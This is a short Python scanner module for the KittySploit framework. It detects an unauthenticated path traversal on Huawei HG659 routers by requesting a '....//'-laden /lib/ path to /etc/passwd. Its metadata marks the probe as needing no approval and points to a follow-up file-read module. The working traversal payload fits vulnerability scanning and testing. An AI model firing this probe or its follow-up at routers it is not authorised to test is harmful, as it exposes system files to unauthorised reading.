#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Huawei HG659 /lib/ path traversal file read."""

import re

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'Huawei HG659 - /lib/ Path Traversal Detection',
        'description': (
            'Detects directory traversal on Huawei HG659 via GET /lib/....//....//etc/passwd '
            '(Greenbone Jun 2021 active check).'
        ),
        'author': ['KittySploit Team'],
        'severity': 'high',
        'tags': [
            'web', 'scanner', 'huawei', 'router', 'lfi', 'path-traversal', 'unauth', 'vuln',
        ],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.3,
            'value': 0.9,
            'requires': {
                'min_endpoints': 0, 'min_params': 0,
                'tech_hints_any': [], 'tech_hints_all': [],
                'specializations_any': [], 'risk_signals_any': [],
                'auth_session': False, 'capabilities_any': [], 'capabilities_all': [],
                'confidence_min': {}, 'confidence_min_any': {},
                'endpoint_pattern_any': [], 'param_any': [], 'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [{'capability': 'file_read', 'from_detail': ''}],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': [
                    'auxiliary/admin/http/huawei_hg659_lib_file_read',
                ],
            },
        },
        'references': [
            'https://ssd-disclosure.com/ssd-advisory-huawei-hg659-arbitrary-file-read/',
        ],
    }

    def run(self):
        path = '/lib/' + ('....//' * 8) + 'etc/passwd'
        r = self.http_request(method='GET', path=path, allow_redirects=False)
        if r and r.status_code == 200 and re.search(r'root:.*:0:0:', r.text or ''):
            self.set_info(
                severity='high',
                reason='Huawei HG659 /lib/ path traversal: /etc/passwd readable',
                path=path,
            )
            return True
        return False
